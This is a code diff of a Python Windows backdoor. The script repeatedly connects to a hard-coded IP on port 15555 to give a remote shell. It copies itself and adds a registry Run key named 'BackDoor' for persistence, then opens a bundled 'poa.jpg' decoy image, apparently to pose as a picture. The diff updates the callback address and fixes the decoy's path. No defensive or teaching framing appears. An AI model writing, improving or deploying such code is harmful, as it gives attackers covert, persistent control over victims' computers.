@@ -1,4 +1,3 @@
-#!/usr/bin/python
 import socket
 import subprocess
 import json
@@ -40,7 +39,7 @@ def connection():
     while True:
         time.sleep(20)
         try:
-            sock.connect(('192.168.1.110', 15555))
+            sock.connect(('192.168.1.119', 15555))
             shell()
         except:
             connection()
@@ -127,7 +126,7 @@ if not os.path.exists(location):
     shutil.copyfile(sys.executable, location)
     subprocess.call('reg add HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v BackDoor /t REG_SZ /d "' + location + '"', shell=True) # Adds a registry key to make the script persist by running automatically on Windows startup.
 
-    name = sys._MEIPATH + '\poa.jpg'
+    name = os.path.join(sys._MEIPASS, 'poa.jpg')
     try:
         subprocess.Popen(name, shell=True)
     except:
